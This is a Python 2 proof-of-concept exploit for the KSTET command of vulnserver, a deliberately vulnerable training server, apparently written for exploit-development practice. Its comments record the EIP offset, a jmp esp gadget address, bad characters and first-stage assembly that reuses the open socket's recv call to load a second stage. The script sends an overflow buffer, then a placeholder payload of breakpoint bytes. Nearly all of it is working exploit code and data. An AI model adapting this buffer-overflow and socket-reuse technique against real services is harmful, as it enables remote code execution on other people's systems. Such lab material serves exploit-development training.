# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# EIP offset: 66
#   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\PT LabMachine\Desktop\vulnserver\essfunc.dll)
# EBB8              jmp short 0xffffffba
# badchars: '\x00'
# Location of recv function:  0040252C
# Location of socket descriptor: 0184FB68   0000005C  \...
# Location of Buffer: 0184F9D2   41               INC ECX
# Buffer length: 200 (512 bytes)
# flags: 00

#First Stage assembly
#0188F99A   54               PUSH ESP
#0188F99B   59               POP ECX
#0188F99C   66:81C1 8801     ADD CX,188
#0188F9A1   83EC 50          SUB ESP,50
#0188F9A4   33DB             XOR EBX,EBX
#0188F9A6   53               PUSH EBX
#0188F9A7   33D2             XOR EDX,EDX
#0188F9A9   80C6 02          ADD DH,2
#0188F9AC   52               PUSH EDX
#0188F9AD   04 42            ADD AL,42
#0188F9AF   50               PUSH EAX
#0188F9B0   FF31             PUSH DWORD PTR DS:[ECX]
#0188F9B2   B8 112C2540      MOV EAX,40252C11
#0188F9B7   C1E8 08          SHR EAX,8
#0188F9BA   FFD0             CALL EAX



import socket
import time

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.12',9999))
print cnct.recv(1024)

firstStage = "\x54\x59\x66\x81\xC1\x88\x01\x83\xEc\x50\x33\xDB\x53\x33\xD2\x80\xC6\x02\x52\x04\x42\x50\xFF\x31\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"
secondStage =  "\xcc" * 512


evilString = firstStage + "\x90"* 32 + "\xdf\x11\x50\x62" + "\xEB\xB8" +"C" * 18
cnct.send("KSTET /.:/"+evilString)
time.sleep(2)
cnct.send(secondStage)
cnct.close()